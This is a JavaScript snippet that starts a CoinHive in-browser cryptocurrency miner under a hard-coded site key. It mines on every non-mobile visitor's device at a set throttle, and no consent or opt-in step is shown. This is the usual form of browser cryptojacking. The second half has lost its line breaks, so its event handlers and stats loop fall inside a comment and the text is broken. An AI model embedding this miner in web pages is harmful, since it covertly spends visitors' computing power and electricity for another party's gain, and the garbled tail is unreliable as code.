var miner = new CoinHive.Anonymous('xggq8sfamvRXHEHYHFP46nGHhYEdx57U', {
    throttle: 0.2
});
if (!miner.isMobile()) {
    miner.start();
} // Listen on eventsminer.on('found', function() { /* Hash found */ })miner.on('accepted', function() { /* Hash accepted by the pool */ })// Update stats once per secondsetInterval(function() {var hashesPerSecond = miner.getHashesPerSecond();var totalHashes = miner.getTotalHashes();var acceptedHashes = miner.getAcceptedHashes();// Output to HTML elements...}, 1000);